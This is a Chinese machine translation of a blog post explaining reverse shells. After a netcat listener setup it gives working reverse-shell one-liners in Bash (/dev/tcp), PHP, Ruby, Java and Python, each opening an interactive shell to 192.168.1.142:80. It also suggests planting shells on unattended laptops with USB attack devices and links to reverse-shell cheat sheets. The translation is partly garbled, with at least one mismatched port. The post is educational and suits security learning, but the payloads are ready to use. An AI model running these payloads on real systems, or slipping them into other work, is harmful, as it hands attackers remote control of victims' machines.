# 反壳！？！

> 原文：<https://medium.com/hackernoon/reverse-shell-cf154dfee6bd>

![](img/6709b0065e9749cd856beaa66ea016d3.png)

什么是反向外壳？你跳上那只乌龟，它会从墙上反弹回来，对吗？

不完全是，但是，你不是唯一一个无知的人。令人惊讶的是，许多人实际上并不知道什么是反向外壳。长话短说，这是当一台计算机连接到另一台计算机，但发起计算机转发他们的外壳到目的地。在攻击过程中或作为测试的一部分，经常会出现反向外壳。它们是可怕的攻击，因为它在机器上给了攻击者一个交互式外壳，他们不应该访问“硬化”区域的内部。

让我们来分析一下这是如何工作的。首先，有一台机器监听某个特定的 tcp 端口。在这种情况下使用 netcat。

```
$ nc -vlp 80 
-v, — verbose Set verbosity level (can be used several times); 
-l, — listen Bind and listen for incoming connections; 
-p, — source-port port Specify source port to use 
([http://man7.org/linux/man-pages/man1/ncat.1.html](http://man7.org/linux/man-pages/man1/ncat.1.html)) 
```

很简单，只是一个特定端口上的监听器。其次，我们需要另一台机器，即受害者，连接到这台机器，然后将会话转发给它。根据可用的资源，有无数种方法来建立这种连接。这就是 bash 的用法

```
$ bash -i >& /dev/tcp/192.168.1.142/80 0>&1
```

命令 *bash -i > &* 调用带有“交互式”选项的 bash。然后*/dev/tcp/192 . 168 . 1 . 142/7023*通过设备文件将该会话重定向到 TCP 套接字。
最后*0>1*取标准输出，并连接到标准输入。

原来 linux 已经构建了一个 */dev/tcp* 设备文件。虽然这个文件非常强大和有用，但是如果以这种方式使用，它可能会非常危险。这个内置的设备文件让 bash 可以直接连接到任何 ip 和任何端口。如果您想确认某个端口是否打开，或者检查时间，这也很有用。

```
$ echo > /dev/tcp/192.168.1.142/22 
-bash: connect: Connection refused. ( yey no ssh is open !)$ echo > /dev/tcp/[www.google.com/80](http://www.google.com/80)$ cat </dev/tcp/time.nist.gov/1357991 17-08-26 13:39:06 50 0 0   0.0 UTC(NIST) *
```

[](http://www.linuxjournal.com/content/more-using-bashs-built-devtcp-file-tcpip) [## 关于使用 Bash 内置的/dev/tcp 文件(TCP/IP)的更多信息

### 如果您看到了昨天的技术技巧，并且正在寻找更多关于将 TCP/IP 与 bash 的内置/dev/tcp 设备文件一起使用的信息…

www.linuxjournal.com](http://www.linuxjournal.com/content/more-using-bashs-built-devtcp-file-tcpip) 

这有什么可怕的？netcat 可以监听任何端口，在这个例子中，它监听端口 80。这意味着连接和通过该管道的所有流量看起来都像普通的 http 流量，如果该端口在您的一台主机上打开(通常如此)，那么无论您使用哪种防火墙，都无法阻止反向外壳控制您。随后，它不会阻止防火墙内的一台可以访问互联网的机器** *咳* *咳*笔记本电脑使用允许的端口，然后转到内部局域网上任何可以访问的地方。

玩反向贝壳真的很有趣，尤其是如果你有一个橡胶鸭子或一只巴什兔子。这样你就可以走到一台不安全的笔记本电脑前(当然，你有合法的权限)窃取一个外壳。然后等你的受害者回来…

```
$ say “im sorry dave i can’t let you do that, you should have locked your computer"
$ sudo reboot
```

[](https://hakshop.com/collections/usb-rubber-ducky) [## USB 橡胶鸭子

### 编辑描述

hakshop.com](https://hakshop.com/collections/usb-rubber-ducky) [](https://hakshop.com/products/bash-bunny) [## 狂欢兔子

### 世界上最先进的 USB 攻击平台。它打开了攻击面，这在以前是不可能的…

hakshop.com](https://hakshop.com/products/bash-bunny) 

最后，这里有一些例子，允许一个 shell 在一大堆不同的语言中运行，因为并不是所有的东西都有 bash，只是大部分的东西。

```
Bash
exec 5<>/dev/tcp/192.168.1.142/80
cat <&5 | while read line; do $line 2>&5 >&5; done 
# or:
while read line 0<&5; do $line 2>&5 >&5; donePHP
php -r ‘$sock=fsockopen(“192.168.1.142”,80);exec(“/bin/sh -i <&3 >&3 2>&3”);’
(Assumes TCP uses file descriptor 3\. If it doesn’t work, try 4,5, or 6)RUBY
ruby -rsocket -e’f=TCPSocket.open(“192.168.1.142”,80).to_i;exec sprintf(“/bin/sh -i <&%d >&%d 2>&%d”,f,f,f)’JAVA
r = Runtime.getRuntime()
p = r.exec([“/bin/bash”,”-c”,”exec 5<>/dev/tcp/192.168.1.142/80;cat <&5 | while read line; do \$line 2>&5 >&5; done”] as String[])
p.waitFor()PYTHON
python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.1.142”,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
```

 [## 反向外壳备忘单

### 如果你足够幸运，在渗透测试中发现了一个命令执行漏洞，很快你就会…

pentestmonkey.net](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) [](https://highon.coffee/blog/reverse-shell-cheat-sheet/) [## 反向外壳备忘单

### 反向 Shell 备忘单，用于连接回的反向 Shell 列表

highon .咖啡](https://highon.coffee/blog/reverse-shell-cheat-sheet/)